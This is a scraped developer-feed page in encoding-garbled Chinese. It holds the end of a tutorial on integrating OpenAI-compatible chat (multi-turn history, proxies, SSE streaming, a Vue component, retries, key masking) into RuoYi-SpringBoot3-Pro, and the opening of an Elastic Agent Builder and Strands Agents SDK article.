    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> List&lt;AIMessage&gt; conversationHistory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> OpenAIClient client;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MultiTurnChat</span><span class="hljs-params">()</span> {
        <span class="hljs-built_in">this</span>.client = OpenAI.chatClient(
            OpenAIConfig.getApiKey(),
            OpenAIConfig.getBaseUrl(),
            OpenAIConfig.getProxy() != <span class="hljs-literal">null</span> ? OpenAIConfig.getProxy().toJavaProxy() : <span class="hljs-literal">null</span>
        );
        <span class="hljs-comment">// è®¾ç½®ç³»ç»Ÿæç¤ºè¯</span>
        conversationHistory.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AIMessage</span>(AIRole.SYSTEM, <span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„æŠ€æœ¯é¡¾é—®ã€‚"</span>));
    }
    
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">chat</span><span class="hljs-params">(String userMessage)</span> {
        <span class="hljs-comment">// æ·»åŠ ç”¨æˆ·æ¶ˆæ¯</span>
        conversationHistory.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AIMessage</span>(AIRole.USER, userMessage));
        
        <span class="hljs-comment">// æ„å»ºå‚æ•°å¹¶è¯·æ±‚</span>
        <span class="hljs-type">ChatCompletionCreateParams</span> <span class="hljs-variable">params</span> <span class="hljs-operator">=</span> OpenAI.chatParams(
            OpenAIConfig.getModel(), 
            conversationHistory
        );
        <span class="hljs-type">String</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> OpenAI.chat(client, params);
        
        <span class="hljs-comment">// ä¿å­˜ AI å›å¤åˆ°å†å²</span>
        conversationHistory.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AIMessage</span>(AIRole.ASSISTANT, response));
        
        <span class="hljs-keyword">return</span> response;
    }
}
</code></pre>
<h4 data-id="heading-13">4.4 ä½¿ç”¨ä»£ç†</h4>
<p>åœ¨ç½‘ç»œå—é™ç¯å¢ƒä¸‹é…ç½®ä»£ç†ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.net.InetSocketAddress;
<span class="hljs-keyword">import</span> java.net.Proxy;

<span class="hljs-comment">// æ–¹å¼ä¸€ï¼šä½¿ç”¨é…ç½®æ–‡ä»¶ä¸­çš„ä»£ç†</span>
<span class="hljs-type">OpenAIClient</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> OpenAI.chatClient(
    OpenAIConfig.getApiKey(),
    OpenAIConfig.getBaseUrl(),
    OpenAIConfig.getProxy().toJavaProxy()
);

<span class="hljs-comment">// æ–¹å¼äºŒï¼šæ‰‹åŠ¨åˆ›å»ºä»£ç†</span>
<span class="hljs-type">Proxy</span> <span class="hljs-variable">httpProxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(
    Proxy.Type.HTTP, 
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InetSocketAddress</span>(<span class="hljs-string">"127.0.0.1"</span>, <span class="hljs-number">7890</span>)
);

<span class="hljs-type">Proxy</span> <span class="hljs-variable">socksProxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(
    Proxy.Type.SOCKS, 
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InetSocketAddress</span>(<span class="hljs-string">"127.0.0.1"</span>, <span class="hljs-number">1080</span>)
);

<span class="hljs-type">OpenAIClient</span> <span class="hljs-variable">clientWithProxy</span> <span class="hljs-operator">=</span> OpenAI.chatClient(
    <span class="hljs-string">"sk-xxx"</span>,
    <span class="hljs-string">"https://api.openai.com/v1"</span>,
    httpProxy
);
</code></pre>
<h3 data-id="heading-14">äº”ã€å…¼å®¹ç¬¬ä¸‰æ–¹ API</h3>
<p>æ¡†æ¶æ”¯æŒæ‰€æœ‰å…¼å®¹ OpenAI åè®®çš„ç¬¬ä¸‰æ–¹ APIï¼Œåªéœ€ä¿®æ”¹ <code>base-url</code> é…ç½®ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">openai:</span>
  <span class="hljs-attr">api-key:</span> <span class="hljs-string">your-api-key</span>
  <span class="hljs-comment"># ä½¿ç”¨ç¬¬ä¸‰æ–¹ API</span>
  <span class="hljs-attr">base-url:</span> <span class="hljs-string">https://your-custom-api.com/v1</span>
  <span class="hljs-attr">model:</span> <span class="hljs-string">your-model-name</span>
</code></pre>
<p>å¸¸è§å…¼å®¹ API ç¤ºä¾‹ï¼š</p>

























<table><thead><tr><th>æœåŠ¡å•†</th><th>base-url ç¤ºä¾‹</th></tr></thead><tbody><tr><td>Azure OpenAI</td><td><code>https://{resource}.openai.azure.com/openai/deployments/{deployment}</code></td></tr><tr><td>æ™ºè°± AI</td><td><code>https://open.bigmodel.cn/api/paas/v4</code></td></tr><tr><td>æœˆä¹‹æš—é¢</td><td><code>https://api.moonshot.cn/v1</code></td></tr><tr><td>DeepSeek</td><td><code>https://api.deepseek.com/v1</code></td></tr></tbody></table>
<h3 data-id="heading-15">å…­ã€å‰ç«¯é›†æˆ</h3>
<h4 data-id="heading-16">6.1 æ¥æ”¶æµå¼å“åº”</h4>
<p>å‰ç«¯ä½¿ç”¨ <code>fetch</code> API å¤„ç† SSE æµå¼å“åº”ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">streamChat</span>(<span class="hljs-params">message</span>) {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/ai/chat/stream'</span>, {
        <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
        <span class="hljs-attr">headers</span>: { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span> },
        <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({ message })
    });
    
    <span class="hljs-keyword">const</span> reader = response.<span class="hljs-property">body</span>.<span class="hljs-title function_">getReader</span>();
    <span class="hljs-keyword">const</span> decoder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextDecoder</span>();
    
    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
        <span class="hljs-keyword">const</span> { done, value } = <span class="hljs-keyword">await</span> reader.<span class="hljs-title function_">read</span>();
        <span class="hljs-keyword">if</span> (done) <span class="hljs-keyword">break</span>;
        
        <span class="hljs-keyword">const</span> text = decoder.<span class="hljs-title function_">decode</span>(value);
        <span class="hljs-keyword">if</span> (text === <span class="hljs-string">'[DONE]'</span>) <span class="hljs-keyword">break</span>;
        
        <span class="hljs-comment">// å®æ—¶æ˜¾ç¤ºå†…å®¹</span>
        <span class="hljs-title function_">appendToChat</span>(text);
    }
}
</code></pre>
<h4 data-id="heading-17">6.2 Vue 3 ç»„ä»¶ç¤ºä¾‹</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div class="chat-container"&gt;
    &lt;div class="messages" ref="messagesRef"&gt;
      &lt;div v-for="msg in messages" :key="msg.id" :class="['message', msg.role]"&gt;
        {{ msg.content }}
      &lt;/div&gt;
    &lt;/div&gt;
    &lt;div class="input-area"&gt;
      &lt;input v-model="input" @keyup.enter="sendMessage" placeholder="è¾“å…¥æ¶ˆæ¯..." /&gt;
      &lt;button @click="sendMessage" :disabled="loading"&gt;å‘é€&lt;/button&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { ref } from 'vue'

const messages = ref([])
const input = ref('')
const loading = ref(false)

async function sendMessage() {
    if (!input.value.trim() || loading.value) return
    
    const userMessage = input.value
    messages.value.push({ id: Date.now(), role: 'user', content: userMessage })
    input.value = ''
    loading.value = true
    
    // æ·»åŠ  AI æ¶ˆæ¯å ä½
    const aiMessage = { id: Date.now() + 1, role: 'assistant', content: '' }
    messages.value.push(aiMessage)
    
    try {
        const response = await fetch('/api/ai/chat/stream', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: userMessage })
        })
        
        const reader = response.body.getReader()
        const decoder = new TextDecoder()
        
        while (true) {
            const { done, value } = await reader.read()
            if (done) break
            
            const text = decoder.decode(value)
            if (text === '[DONE]') break
            
            aiMessage.content += text
        }
    } finally {
        loading.value = false
    }
}
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-18">ä¸ƒã€æœ€ä½³å®è·µ</h3>
<h4 data-id="heading-19">7.1 é”™è¯¯å¤„ç†</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">safeChatWithRetry</span><span class="hljs-params">(String message, <span class="hljs-type">int</span> maxRetries)</span> {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; maxRetries; i++) {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">return</span> simpleChat(message);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (i == maxRetries - <span class="hljs-number">1</span>) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"AI æœåŠ¡è°ƒç”¨å¤±è´¥: "</span> + e.getMessage(), e);
            }
            <span class="hljs-comment">// ç­‰å¾…åé‡è¯•</span>
            <span class="hljs-keyword">try</span> {
                Thread.sleep(<span class="hljs-number">1000</span> * (i + <span class="hljs-number">1</span>));
            } <span class="hljs-keyword">catch</span> (InterruptedException ie) {
                Thread.currentThread().interrupt();
            }
        }
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
}
</code></pre>
<h4 data-id="heading-20">7.2 Token æ§åˆ¶</h4>
<p>åˆç†æ§åˆ¶å¯¹è¯å†å²é•¿åº¦ï¼Œé¿å…è¶…å‡ºæ¨¡å‹ Token é™åˆ¶ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">trimConversationHistory</span><span class="hljs-params">(<span class="hljs-type">int</span> maxMessages)</span> {
    <span class="hljs-keyword">if</span> (conversationHistory.size() &gt; maxMessages) {
        <span class="hljs-comment">// ä¿ç•™ç³»ç»Ÿæç¤ºè¯å’Œæœ€è¿‘çš„æ¶ˆæ¯</span>
        <span class="hljs-type">AIMessage</span> <span class="hljs-variable">systemMessage</span> <span class="hljs-operator">=</span> conversationHistory.get(<span class="hljs-number">0</span>);
        List&lt;AIMessage&gt; recentMessages = conversationHistory.subList(
            conversationHistory.size() - maxMessages + <span class="hljs-number">1</span>, 
            conversationHistory.size()
        );
        conversationHistory.clear();
        conversationHistory.add(systemMessage);
        conversationHistory.addAll(recentMessages);
    }
}
</code></pre>
<h4 data-id="heading-21">7.3 æ•æ„Ÿä¿¡æ¯ä¿æŠ¤</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸è¦åœ¨æ—¥å¿—ä¸­æ‰“å°å®Œæ•´çš„ API Key</span>
<span class="hljs-type">String</span> <span class="hljs-variable">maskedKey</span> <span class="hljs-operator">=</span> apiKey.substring(<span class="hljs-number">0</span>, <span class="hljs-number">8</span>) + <span class="hljs-string">"..."</span> + apiKey.substring(apiKey.length() - <span class="hljs-number">4</span>);
log.info(<span class="hljs-string">"Using API Key: {}"</span>, maskedKey);
</code></pre>
<h3 data-id="heading-22">å…«ã€æ€»ç»“</h3>
<p>RuoYi-SpringBoot3-Pro çš„ AI èƒ½åŠ›é›†æˆæ¨¡å—å…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š</p>
<ul>
<li><strong>å¼€ç®±å³ç”¨</strong>ï¼šåŸºäºå®˜æ–¹ SDK å°è£…ï¼Œé…ç½®ç®€å•</li>
<li><strong>åŠŸèƒ½å®Œæ•´</strong>ï¼šæ”¯æŒåŒæ­¥/æµå¼å¯¹è¯ã€å¤šè§’è‰²ã€ä»£ç†é…ç½®</li>
<li><strong>æ‰©å±•æ€§å¼º</strong>ï¼šå…¼å®¹æ‰€æœ‰ OpenAI åè®®çš„ç¬¬ä¸‰æ–¹ API</li>
<li><strong>æ˜“äºé›†æˆ</strong>ï¼šæä¾›å®Œæ•´çš„å·¥å…·ç±»å’Œç¤ºä¾‹ä»£ç </li>
</ul>
<hr/>
<ul>
<li>é¡¹ç›®åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fundsky%2FRuoYi-SpringBoot3-Pro" target="_blank" title="https://github.com/undsky/RuoYi-SpringBoot3-Pro" ref="nofollow noopener noreferrer">RuoYi-SpringBoot3-Pro</a></li>
<li>å¼€å‘æ–‡æ¡£ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.undsky.com%2Fblog%2F%3Fcategory%3DRuoYi-SpringBoot3-Pro%23" target="_blank" title="https://www.undsky.com/blog/?category=RuoYi-SpringBoot3-Pro#" ref="nofollow noopener noreferrer">RuoYi-SpringBoot3-Pro æ–‡æ¡£</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¼€å§‹ä½¿ç”¨ Elastic Agent Builder å’Œ Strands Agents SDK]]></title>    <link>https://juejin.cn/post/7583984122235011114</link>    <guid>https://juejin.cn/post/7583984122235011114</guid>    <pubDate>2025-12-16T02:36:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583984122235011114" data-draft-id="7583984122234994730" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¼€å§‹ä½¿ç”¨ Elastic Agent Builder å’Œ Strands Agents SDK"/> <meta itemprop="keywords" content="Elasticsearch"/> <meta itemprop="datePublished" content="2025-12-16T02:36:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Elasticsearch"/> <meta itemprop="url" content="https://juejin.cn/user/2612095360441448"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¼€å§‹ä½¿ç”¨ Elastic Agent Builder å’Œ Strands Agents SDK
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2612095360441448/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Elasticsearch
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T02:36:28.000Z" title="Tue Dec 16 2025 02:36:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½œè€…ï¼šæ¥è‡ª ElasticÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fsearch-labs%2Fauthor%2Fjonathan-simon" title="https://www.elastic.co/search-labs/author/jonathan-simon" target="_blank" ref="nofollow noopener noreferrer">Jonathan Simon</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/11ba9b4e53644aa39a1a352d8f776e87~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457388&amp;x-signature=J5Yp2xy6fJT60smGnPDVr7BXiD0%3D" alt="" loading="lazy"/></p>
<p>å­¦ä¹ å¦‚ä½•ä½¿ç”¨ Elastic Agent Builder åˆ›å»ºä¸€ä¸ª agentï¼Œç„¶åæ¢ç´¢å¦‚ä½•é€šè¿‡ A2A åè®®ï¼Œåœ¨ Strands Agents SDK çš„ç¼–æ’ä¸‹ä½¿ç”¨è¯¥ agentã€‚</p>
<p>Elasticsearch ä¸è¡Œä¸šé¢†å…ˆçš„ Gen AI å·¥å…·å’Œæä¾›å•†æœ‰åŸç”Ÿé›†æˆã€‚æŸ¥çœ‹æˆ‘ä»¬çš„ç½‘ç»œç ”è®¨ä¼šï¼Œäº†è§£å¦‚ä½•<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fvirtual-events%2Fbeyond-rag-basics" title="https://www.elastic.co/virtual-events/beyond-rag-basics" target="_blank" ref="nofollow noopener noreferrer">è¶…è¶Š RAG åŸºç¡€</a>ï¼Œæˆ–ä½¿ç”¨ Elastic vector database <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fvirtual-events%2Fvector-databases-fast-track-production" title="https://www.elastic.co/virtual-events/vector-databases-fast-track-production" target="_blank" ref="nofollow noopener noreferrer">æ„å»º prod-ready åº”ç”¨</a>ã€‚</p>
<p>ä¸ºäº†ä¸ºä½ çš„ä½¿ç”¨åœºæ™¯æ„å»ºæœ€ä½³çš„æœç´¢è§£å†³æ–¹æ¡ˆï¼Œç°åœ¨å°±å¼€å§‹<a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.elastic.co%2Fregistration" title="https://cloud.elastic.co/registration" target="_blank" ref="nofollow noopener noreferrer">å…è´¹çš„ cloud è¯•ç”¨</a>ï¼Œæˆ–åœ¨ä½ çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F143747798" title="https://elasticstack.blog.csdn.net/article/details/143747798" target="_blank" ref="nofollow noopener noreferrer">æœ¬åœ°æœºå™¨</a>ä¸Šè¯•ç”¨ Elasticã€‚</p>
<p>æœ‰ä¸€ä¸ª AI agent çš„æƒ³æ³•å—ï¼Ÿå®ƒå¾ˆå¯èƒ½æ¶‰åŠå¯¹æ•°æ®åšä¸€äº›äº‹æƒ…ï¼Œå› ä¸ºå¦‚æœä¸€ä¸ª agent è¦å‘èµ·æœ‰ç”¨çš„æ“ä½œï¼Œå®ƒéœ€è¦åšå‡ºå†³ç­–ï¼Œè€Œå®ƒéœ€è¦æ­£ç¡®çš„æ•°æ®æ¥åšå‡ºæ­£ç¡®çš„å†³ç­–ã€‚</p>
<p>Elastic Agent Builder è®©æ„å»ºä¸æ•°æ®è¿æ¥çš„ AI agent å˜å¾—ç®€å•ã€‚æˆ‘ä»¬å°†åœ¨è¿™ç¯‡åšå®¢ä¸­å‘ä½ å±•ç¤ºå¦‚ä½•åšåˆ°è¿™ä¸€ç‚¹ã€‚è®©æˆ‘ä»¬ä¸€èµ·èµ°è¿‡ä½¿ç”¨ä¸€ä¸ªè®¿é—®å­˜å‚¨åœ¨ Elastic ä¸­çš„æ•°æ®çš„ MCP å·¥å…·æ¥åˆ›å»ºä¸€ä¸ª agent æ‰€éœ€çš„æ‰€æœ‰æ­¥éª¤ã€‚ç„¶åï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ Strands Agents SDK åŠå…¶ Agent2Agent ( A2A ) åŠŸèƒ½æ¥è¿è¡Œè¯¥ agentã€‚<a href="https://link.juejin.cn?target=https%3A%2F%2Fstrandsagents.com%2F" title="https://strandsagents.com/" target="_blank" ref="nofollow noopener noreferrer">Strands Agents SDK</a>æ˜¯ä¸€ä¸ªå¤š agent çš„ AI å¼€å‘å¹³å°ï¼Œä½ å¯ä»¥ç”¨å®ƒä»¥è¶³å¤Ÿå°‘çš„ä»£ç æ¥æ„å»º agentic åº”ç”¨ï¼Œä»è€Œç¡®ä¿ä½ è·å¾—æƒ³è¦çš„ç»“æœã€‚</p>
<p>è®©æˆ‘ä»¬æ„å»ºä¸€ä¸ª AI agent æ¥ç© RPS+ æ¸¸æˆï¼Œè¿™æ˜¯ç»å…¸çš„ Rock Paper Scissors æ¸¸æˆçš„ä¸€ä¸ªå˜ä½“ï¼Œå¢åŠ äº†ä¸€ç‚¹å˜åŒ–ï¼›å®ƒä¸ºæ¸¸æˆç©å®¶æä¾›äº†å‡ ä¸ªé¢å¤–çš„é€‰æ‹©ã€‚</p>
<p>æ›´å¤šé˜…è¯»ï¼š</p>
<ul>
<li>Elastic AI agent builder ä»‹ç»ï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F152212513" title="https://elasticstack.blog.csdn.net/article/details/152212513" target="_blank" ref="nofollow noopener noreferrer">ä¸€</a>ï¼‰ï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F153689733" title="https://elasticstack.blog.csdn.net/article/details/153689733" target="_blank" ref="nofollow noopener noreferrer">äºŒ</a>ï¼‰ï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F154293247" title="https://elasticstack.blog.csdn.net/article/details/154293247" target="_blank" ref="nofollow noopener noreferrer">ä¸‰</a>ï¼‰ï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F155194636" title="https://elasticstack.blog.csdn.net/article/details/155194636" target="_blank" ref="nofollow noopener noreferrer">å››</a>ï¼‰ï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F155241617" title="https://elasticstack.blog.csdn.net/article/details/155241617" target="_blank" ref="nofollow noopener noreferrer">äº”</a>ï¼‰</li>
</ul>
<h2 data-id="heading-0">å…ˆå†³æ¡ä»¶</h2>
<p>ä»¥ä¸‹æ˜¯æŒ‰ç…§æœ¬åšæ–‡æ­¥éª¤æ‰€éœ€çš„æ¡ä»¶ï¼š</p>
<ul>
<li>åœ¨æœ¬åœ°ç”µè„‘ä¸Šè¿è¡Œçš„æ–‡æœ¬ç¼–è¾‘å™¨
<ul>
<li>æœ¬åšæ–‡ç¤ºä¾‹è¯´æ˜ä¸­ä½¿ç”¨çš„æ˜¯ <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.visualstudio.com%2Fdownload" title="https://code.visualstudio.com/download" target="_blank" ref="nofollow noopener noreferrer">Visual Studio Code</a></li>
</ul>
</li>
<li>åœ¨æœ¬åœ°ç”µè„‘ä¸Šè¿è¡Œçš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.python.org%2Fdownloads%2F" title="https://www.python.org/downloads/" target="_blank" ref="nofollow noopener noreferrer">Python 3.10 æˆ–æ›´é«˜ç‰ˆæœ¬</a></li>
</ul>
<h2 data-id="heading-1">åˆ›å»ºæ— æœåŠ¡å™¨é¡¹ç›®</h2>
<p>æˆ‘ä»¬é¦–å…ˆéœ€è¦ä¸€ä¸ª Elasticsearch <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fcloud%2Fserverless" title="https://www.elastic.co/cloud/serverless" target="_blank" ref="nofollow noopener noreferrer">æ— æœåŠ¡å™¨</a>é¡¹ç›®ï¼Œå…¶ä¸­åŒ…æ‹¬ Elastic Agent Builderã€‚</p>
<p>è®¿é—® <a href="https://link.juejin.cn?target=http%3A%2F%2Fcloud.elastic.co%2F" title="http://cloud.elastic.co/" target="_blank" ref="nofollow noopener noreferrer">cloud.elastic.co</a> å¹¶åˆ›å»ºä¸€ä¸ªæ–°çš„ Elasticsearch æ— æœåŠ¡å™¨é¡¹ç›®ã€‚</p>
